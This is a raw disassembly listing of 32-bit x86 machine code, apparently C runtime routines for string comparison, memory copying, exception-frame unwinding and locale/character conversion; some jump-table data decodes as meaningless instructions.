  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
